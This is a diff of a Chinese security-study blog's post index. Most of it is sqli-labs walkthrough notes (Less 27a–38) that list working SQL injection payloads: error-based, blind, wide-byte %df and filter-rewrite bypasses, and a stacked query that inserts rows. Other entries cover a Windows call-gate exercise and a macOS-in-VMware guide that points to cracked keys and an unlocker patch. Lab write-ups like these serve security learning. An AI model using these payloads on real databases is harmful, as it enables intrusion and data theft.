-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;||updatexml(1,concat(0,(database())),0)||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27;||updatexml(1,concat(0x7e,(seleselselectectct%0atable_name%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#x27;</span>security<span class="string">&#x27;%0alimit%0a0,1),0x7e),1)||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>成功</p>
-<hr>
-<h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>还是过滤<code>union</code> <code>select</code>，看看过滤程度<br>还是三次重写解决,union用两次重写<br>这里单引号不报错，双引号报错发现是双引号闭合且无报错提示<br>所以使用盲注</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;%26%26substring(database(),1,1)=&#x27;d&#x27;%26%26&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line"># 无回显</span><br><span class="line">&quot;%26%26substring(database(),1,1)=&#x27;s&#x27;%26%26&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line"># 回显正常</span><br></pre></td></tr></table></figure>
-<p>成功</p>
-<hr>
-<h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>同样先探测闭合方式<br>确认是单引号闭合</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;)union select 1,2,3||(&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="comment">--&gt; &#x27;)unionselect1,2,3||(&#x27;1</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>过滤空格使<span class="keyword">select</span>失效</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;)aunion%0aselect%0a1,2,3||(&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="comment">--&gt; &#x27;)1,2,3||(&#x27;1</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>过滤<span class="keyword">union</span> <span class="keyword">select</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;)uunionnion%0aselselectect%0a1,2,3||(&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="comment">--&gt;&#x27;)uunionnion selselectect 1,2,3||(&#x27;1</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>重写无效</span><br></pre></td></tr></table></figure>
-<p>看来是检查select和union之间的有效连接</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">999</span><span class="string">&#x27;)union%0adistinct%0aselect%0a1,group_concat(table_name),3%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%0a||(&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="comment">--&gt; union distinct select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() ||(&#x27;1</span></span><br></pre></td></tr></table></figure>
-<p>成功</p>
-<hr>
-<h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>和上题一样只不过少了一些过滤</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">99</span><span class="string">&#x27;)union distinct select 1,database(),3||(&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>回显正常<br>成功</p>
-<hr>
-<h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><p>首先确定闭合方式为单引号闭合</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">99</span><span class="string">&#x27; union select 1,database(),3 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>成功</p>
-<p>盲注</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>bool盲注</span><br><span class="line"><span class="string">&#x27; and length(database())=9 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> </span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>时间盲注</span><br><span class="line"><span class="string">&#x27; and if(length(database())=8,sleep(5),1) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>成功</p>
-<p>报错注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>成功<br>这里好像要自己加载waf，这里就不做继续</p>
-<hr>
-<h2 id="Less-29a"><a href="#Less-29a" class="headerlink" title="Less-29a"></a>Less-29a</h2><p>双引号闭合<br>也是需要自己加载waf</p>
-<hr>
-<h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><p>单引号闭合<br>需要自己加载waf</p>
-<hr>
-<h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>“)闭合<br>需要自己加waf</p>
-<hr>
-<blockquote>
-<p>以上waf关卡不知道是我的问题还是关卡问题需要自己加载waf<br>由于特地绕过一段时间，这里不做练习</p>
-</blockquote>
-<hr>
-<h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><blockquote>
-<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串</p>
-</blockquote>
-<p>这里我们使用宽字节注入，在前边添加%df,形成%df%27来过掉%5c</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-<p>成功<br>而后面的</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span>df<span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--&gt; %df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x27757365727327</span></span><br></pre></td></tr></table></figure>
-<p>hex编码绕过</p>
-<hr>
-<h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>这里的文件和Less-32一样，不做练习</p>
-<hr>
-<h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>这是一个POST类型的宽字节注入<br>首先抓包扔burp</p>
-<p>测试uname</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">%</span>df<span class="string">&#x27;&amp;passwd=1&amp;submit=Submit --&gt; 1&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>测试passwd</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27;&amp;submit=Submit --&gt; &#x27;</span><span class="number">1</span>�\<span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>都存在注入<br>接着</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,2 #&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname=admin &amp;passwd=1%df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x27757365727327</span> #<span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
-<p>回显正常，成功</p>
-<hr>
-<h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>试了半天宽字节后发现tm直接能注<br>也不知道是不是我的bug</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span> #</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x27757365727327</span> #</span><br></pre></td></tr></table></figure>
-<p>回显成功</p>
-<hr>
-<h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>显注，盲注，报错注入，宽字节注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span>df<span class="string">&#x27; union select 1,2,3 %23</span></span><br><span class="line"><span class="string">%df&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">8</span> <span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="operator">%</span>df <span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line"><span class="operator">%</span>df<span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span></span><br></pre></td></tr></table></figure>
-<p>成功<br>这里不能直接用#来进行注释，用%23</p>
-<p>这里mysql的real_escape_strings</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line"></span><br><span class="line">下列字符受影响：</span><br><span class="line"></span><br><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&#39;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br><span class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</span><br><span class="line"></span><br><span class="line">来自：w3school</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>这题和上题一样是bypass mysql_real_escape_strings</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,2 %23&amp;passwd=2&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
-<p>宽字节绕过，成功</p>
-<hr>
-<h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><p>估计也是宽字节注入，只不过</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,(concat(0,(select database()),0x0)),1) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>回显成功</p>
-<p><code>stacked query（堆叠查询）</code>的适用条件</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MySQL<span class="operator">/</span>PHP <span class="operator">-</span> <span class="keyword">Not</span> supported (supported <span class="keyword">by</span> MySQL <span class="keyword">for</span> other API).</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span> Server<span class="operator">/</span><span class="keyword">Any</span> API <span class="operator">-</span> Supported.</span><br><span class="line"></span><br><span class="line">Oracle<span class="operator">/</span><span class="keyword">Any</span> API <span class="operator">-</span> <span class="keyword">Not</span> supported.</span><br></pre></td></tr></table></figure>
-<p>很高的局限性哈</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3;insert into users values(1,&#x27;</span>Sunr<span class="string">&#x27;,&#x27;</span>Sunr<span class="string">&#x27;)%23</span></span><br></pre></td></tr></table></figure>
-<p>然后我们来看<br><img src="https://i.loli.net/2020/09/07/RBweZOCoJ5l9kxT.png" alt="image.png"><br>确定被插入</p>
-<p>使用堆叠注入我们可以用分号分隔开sql语句，但回显的只有第一条，但是后面拼接的可以实现增删改，甚至可以写shell</p>
-<p><a href="https://www.sqlinjection.net/stacked-queries/">相关资料</a></p>
-<p>就到这里</p>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-        <tag>渗透</tag>
-        <tag>sqli-lab</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-lab Less 39-Less 53</title>
     <url>/2020/09/09/sqli-lab-Less-39-Less-53/</url>
     <content><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-39-Less-53"><a href="#Sqli-lab-过关笔记-Less-39-Less-53" class="headerlink" title="Sqli-lab 过关笔记 Less 39-Less 53"></a>Sqli-lab 过关笔记 Less 39-Less 53</h1><a id="more"></a>
@@ -579,6 +579,33 @@
         <tag>笔记</tag>
         <tag>渗透</tag>
         <tag>sqli-lab</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>中断门练习</title>
+    <url>/2021/02/05/%E4%B8%AD%E6%96%AD%E9%97%A8%E7%BB%83%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="0x00-中断门"><a href="#0x00-中断门" class="headerlink" title="0x00 中断门"></a>0x00 中断门</h1><p>中断门位于IDT表中，处理器利用IDT表中的描述符来处理异常和中断</p>
+<a id="more"></a>
+
+
+
+<p><strong>浅析</strong></p>
+<h2 id="0x10-描述符"><a href="#0x10-描述符" class="headerlink" title="0x10 描述符"></a>0x10 描述符</h2><p><img src="https://i.loli.net/2021/02/25/XGmoA5rbFJINTzD.png" alt="image-20210225002129735"></p>
+<p>这是中断门的描述符第11位D位为0是16位下的中断门，而为1则是32位下的中断门（Type位描述的）</p>
+<p>这里我们可以构造一个中断描述符</p>
+<blockquote>
+<p>xxxxee00`xxxxxxxx</p>
+<p>xxxxe600`xxxxxxxx</p>
+</blockquote>
+<h2 id="0x11-权限检查"><a href="#0x11-权限检查" class="headerlink" title="0x11  权限检查"></a>0x11  权限检查</h2><p>依旧是RPL&lt;= Interrupt Gate DPL </p>
+<h2 id="0x12-堆栈切换"><a href="#0x12-堆栈切换" class="headerlink" title="0x12 堆栈切换"></a>0x12 堆栈切换</h2><p>在低权限请求下会使用TSS自动切换到中断处理的堆栈空间，而原先的会被保存</p>
+<p><img src="https://i.loli.net/2021/02/25/uGCzatPYoO6KrTd.png" alt="image-20210225003548742"></p>
+<p>所以，从门返回该用iret/iretd</p>
+<h1 id="0x01练习1"><a href="#0x01练习1" class="headerlink" title="0x01练习1"></a>0x01练习1</h1><p>在中断门通过retf返回,在调用门通过iretd返回</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> cs_eip[<span class="number">6</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x48</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">DWORD data;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">InGate1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm </span><br><span class="line">	&#123;</span><br><span class="line">		pop eax</span><br><span class="line">        pop ebx</span><br><span class="line">        pop ecx</span><br><span class="line">        push ebx</span><br><span class="line">        push eax</span><br><span class="line">		retf</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">CallGate1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm </span><br><span class="line">	&#123;</span><br><span class="line">		pop eax</span><br><span class="line">        pop ebx</span><br><span class="line">        pushfd</span><br><span class="line">        push ebx</span><br><span class="line">        push eax</span><br><span class="line">		iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="keyword">int</span> <span class="number">32</span></span><br><span class="line">		call fword ptr[cs_eip] <span class="comment">//还可以使用有参提权来把eflag当一个参数传进去</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>笔记</tag>
+        <tag>保护模式</tag>
       </tags>
   </entry>
   <entry>
@@ -677,18 +704,6 @@
       </tags>
   </entry>
   <entry>
-    <title>中断门练习</title>
-    <url>/2021/02/05/%E4%B8%AD%E6%96%AD%E9%97%A8%E7%BB%83%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="0x01练习1"><a href="#0x01练习1" class="headerlink" title="0x01练习1"></a>0x01练习1</h1><p>在中断门通过retf返回,在调用门通过iretd返回</p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> cs_eip[<span class="number">6</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x48</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">DWORD data;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">InGate1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm </span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line"></span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax+<span class="number">0x24</span>+<span class="number">0x08</span>]</span><br><span class="line">		push ebx</span><br><span class="line">		popfd</span><br><span class="line">		mov ebx,[eax+<span class="number">0x24</span>+<span class="number">0x04</span>]</span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x08</span>],ebx</span><br><span class="line">		mov ebx,[eax+<span class="number">0x24</span>]</span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x04</span>],ebx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">		pop eax</span><br><span class="line">		retf</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">CallGate1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm </span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax+<span class="number">0x20</span>]</span><br><span class="line">		mov ecx,[eax+<span class="number">0x24</span>+<span class="number">0x04</span>]</span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x04</span>],ebx</span><br><span class="line"></span><br><span class="line">		mov ebx,[eax+<span class="number">0x24</span>]</span><br><span class="line">		mov [eax+<span class="number">0x20</span>],ebx</span><br><span class="line"></span><br><span class="line">		mov [eax+<span class="number">0x24</span>],ecx</span><br><span class="line"></span><br><span class="line">		popad</span><br><span class="line">		iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="keyword">int</span> <span class="number">32</span></span><br><span class="line">		call fword ptr[cs_eip]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>笔记</tag>
-        <tag>保护模式</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>任务段，任务门练习</title>
     <url>/2021/02/08/%E4%BB%BB%E5%8A%A1%E6%AE%B5%EF%BC%8C%E4%BB%BB%E5%8A%A1%E9%97%A8%E7%BB%83%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="0x00-任务段"><a href="#0x00-任务段" class="headerlink" title="0x00 任务段"></a>0x00 任务段</h1><blockquote>
@@ -771,6 +786,84 @@
       <tags>
         <tag>笔记</tag>
         <tag>保护模式</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>在VMware Player 15中安装MacOS</title>
+    <url>/2020/03/02/%E5%9C%A8VMware-Player-15%E4%B8%AD%E5%AE%89%E8%A3%85MacOS/</url>
+    <content><![CDATA[<h1 id="0x0-安装前准备"><a href="#0x0-安装前准备" class="headerlink" title="0x0 安装前准备"></a>0x0 安装前准备</h1><blockquote>
+<p>材料准备：</p>
+</blockquote>
+<blockquote>
+<ol>
+<li><p>镜像文件：这里我使用的是 OS X 10.13</p>
+</li>
+<li><p>VMware 的 MacOS的破解补丁</p>
+</li>
+<li><p>VMware Workstation 15 软件，注册码或注册机自己百度，嫌麻烦就使用VirtualBox</p>
+</li>
+</ol>
+</blockquote>
+<a id="more"></a>
+
+<p>文件链接 :  <a href="https://pan.baidu.com/s/1YqU5nhO764ANK_x4bgvJaA">密码:2333</a>    <a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.1-15018445.exe">VMware Download</a> </p>
+<h1 id="0x1-安装"><a href="#0x1-安装" class="headerlink" title="0x1 安装"></a>0x1 安装</h1><p>下载破解补丁后解压出来以管理员模式运行 <em>win-install.cmd</em>  </p>
+<p><img src="https://i.loli.net/2020/03/02/MOaZzCDIqcUn2xw.png" alt="unlocker.png"></p>
+<p>运行结束后就开始使用VMware Workstation 15 Player部署呗</p>
+<p><img src="https://i.loli.net/2020/03/02/JBA96jwbYCuaQP1.png" alt="1.png"></p>
+<p><img src="https://i.loli.net/2020/03/02/U3NWGHA7lzxT4Kw.png" alt="2.png"></p>
+<p><img src="https://i.loli.net/2020/03/02/jdQMYgVZt1q357f.png" alt="3.png"></p>
+<p>之后便是一路Next，最后Fish</p>
+<hr>
+<p>启动虚拟机后可能会出现以下问题</p>
+<p><img src="https://i.loli.net/2020/03/02/fXqvI9SE5YRT3WA.png" alt="4.png"></p>
+<p>这是因为要检查很多东西，百度一下发现如下解决方法：</p>
+<blockquote>
+<ol>
+<li>在虚拟机的路径中找到 <code>.vmx</code> 的文件</li>
+<li>打开文件找到一行类似 <code>guestOS = &quot;darwin17-64&quot;</code></li>
+<li>下一行追加 <code>cpuid.1.eax = &quot;0000:0000:0000:0001:0000:0110:1010:0101&quot;</code></li>
+</ol>
+</blockquote>
+<p>保存再启动就可以解决，大概原理是虚拟机会对对核心进行检验，用mask来欺骗，从而过CPU不必要的检查</p>
+<p>(#其实我也不知道，手动滑稽)</p>
+<h1 id="0x2-系统安装"><a href="#0x2-系统安装" class="headerlink" title="0x2 系统安装"></a>0x2 系统安装</h1><p>进入界面后第一件事，调出终端建议进行以下步骤方便后续安装VMware Tools ：<a href="#0x4-VMware-Tools%E5%AE%89%E8%A3%85">VMware Tools安装</a></p>
+<p>再进行进行磁盘管理</p>
+<p><img src="https://i.loli.net/2020/03/02/tz6FoAHBXE2hwQc.png" alt="5.png"></p>
+<p><img src="https://i.loli.net/2020/03/02/wgE1uv3GJy6AFcD.png" alt="6.png"></p>
+<p>作为系统盘呗，需要自己再自行添加硬盘</p>
+<p><img src="https://i.loli.net/2020/03/02/DrBsNQeHL1ipIlj.png" alt="7.png"></p>
+<p>之后就是等它静默安装，然后再进行常规的系统配置</p>
+<p><img src="https://i.loli.net/2020/03/02/r8wZbAIHmqoQEeu.png" alt="9.png"></p>
+<p>安装好VMware Tools后就开始享用OS X吧</p>
+<h1 id="0x3-添加硬盘及网络配置"><a href="#0x3-添加硬盘及网络配置" class="headerlink" title="0x3 添加硬盘及网络配置"></a>0x3 添加硬盘及网络配置</h1><p><img src="https://i.loli.net/2020/03/02/uzWvTp3qRwmAUOD.png" alt="10.png"></p>
+<p>设置网络 设置 - &gt; 网络 - &gt; WLAN - &gt; 更改适配器设置</p>
+<p><img src="https://i.loli.net/2020/03/02/QeGR8d5CFU3whp1.png" alt="11.png"></p>
+<p><img src="https://i.loli.net/2020/03/02/Voeaxsi57QCBF8N.png" alt="12.png"></p>
+<p><img src="https://i.loli.net/2020/03/02/wWmnTudCaGfqscD.png" alt="12.png"></p>
+<p><img src="https://i.loli.net/2020/03/02/U4fxJuE8lvwtVO1.png" alt="12.png"></p>
+<p>然后进Mac看设置</p>
+<p><img src="https://i.loli.net/2020/03/02/cFeDdaQlm8326WZ.png" alt="13.png"></p>
+<p>显示绿点则说明连接成功</p>
+<h1 id="0x4-VMware-Tools安装"><a href="#0x4-VMware-Tools安装" class="headerlink" title="0x4 VMware Tools安装"></a>0x4 VMware Tools安装</h1><p>反复装不上VMware Tools 通过百度发现Mac有SIP系统完整性保护机制</p>
+<p>我们就进入Recovery里手动关闭</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># csrutil status &#x2F;&#x2F;检查状态 enable 为开启</span><br><span class="line"># csrutil disable &#x2F;&#x2F;关闭保护机制</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p><img src="https://i.loli.net/2020/03/03/P6o8CTOLGdAfkIQ.png" alt="16.png"></p>
+<p><img src="https://i.loli.net/2020/03/03/or9MFBzdan1KvGC.png" alt="17.png"></p>
+<p>之后便可以开心的安装VMware Tools 了</p>
+<p><img src="https://i.loli.net/2020/03/03/cKBhbYw6ROHlTvI.png" alt="18.png"></p>
+<h1 id="0x5-安装Xcode"><a href="#0x5-安装Xcode" class="headerlink" title="0x5 安装Xcode"></a>0x5 安装Xcode</h1><p>就在商店自己安装呗，现在Xcode的最低支持版本是 OS X 10.14.4</p>
+<p><img src="https://i.loli.net/2020/03/03/S6VIMvT7AEYxaLo.png" alt="19.png"></p>
+<p>然后就可以 愉cao 快dan的 敲xiu 码bug 了</p>
+<hr>
+<p>[^]: 注：本文资料大多来源于网络，如果有侵权，请联系作者删除。2020/03/03 二次修改。</p>
+]]></content>
+      <tags>
+        <tag>黑苹果</tag>
       </tags>
   </entry>
   <entry>
@@ -980,84 +1073,6 @@
       <tags>
         <tag>笔记</tag>
         <tag>保护模式</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>在VMware Player 15中安装MacOS</title>
-    <url>/2020/03/02/%E5%9C%A8VMware-Player-15%E4%B8%AD%E5%AE%89%E8%A3%85MacOS/</url>
-    <content><![CDATA[<h1 id="0x0-安装前准备"><a href="#0x0-安装前准备" class="headerlink" title="0x0 安装前准备"></a>0x0 安装前准备</h1><blockquote>
-<p>材料准备：</p>
-</blockquote>
-<blockquote>
-<ol>
-<li><p>镜像文件：这里我使用的是 OS X 10.13</p>
-</li>
-<li><p>VMware 的 MacOS的破解补丁</p>
-</li>
-<li><p>VMware Workstation 15 软件，注册码或注册机自己百度，嫌麻烦就使用VirtualBox</p>
-</li>
-</ol>
-</blockquote>
-<a id="more"></a>
-
-<p>文件链接 :  <a href="https://pan.baidu.com/s/1YqU5nhO764ANK_x4bgvJaA">密码:2333</a>    <a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.1-15018445.exe">VMware Download</a> </p>
-<h1 id="0x1-安装"><a href="#0x1-安装" class="headerlink" title="0x1 安装"></a>0x1 安装</h1><p>下载破解补丁后解压出来以管理员模式运行 <em>win-install.cmd</em>  </p>
-<p><img src="https://i.loli.net/2020/03/02/MOaZzCDIqcUn2xw.png" alt="unlocker.png"></p>
-<p>运行结束后就开始使用VMware Workstation 15 Player部署呗</p>
-<p><img src="https://i.loli.net/2020/03/02/JBA96jwbYCuaQP1.png" alt="1.png"></p>
-<p><img src="https://i.loli.net/2020/03/02/U3NWGHA7lzxT4Kw.png" alt="2.png"></p>
-<p><img src="https://i.loli.net/2020/03/02/jdQMYgVZt1q357f.png" alt="3.png"></p>
-<p>之后便是一路Next，最后Fish</p>
-<hr>
-<p>启动虚拟机后可能会出现以下问题</p>
-<p><img src="https://i.loli.net/2020/03/02/fXqvI9SE5YRT3WA.png" alt="4.png"></p>
-<p>这是因为要检查很多东西，百度一下发现如下解决方法：</p>
-<blockquote>
-<ol>
-<li>在虚拟机的路径中找到 <code>.vmx</code> 的文件</li>
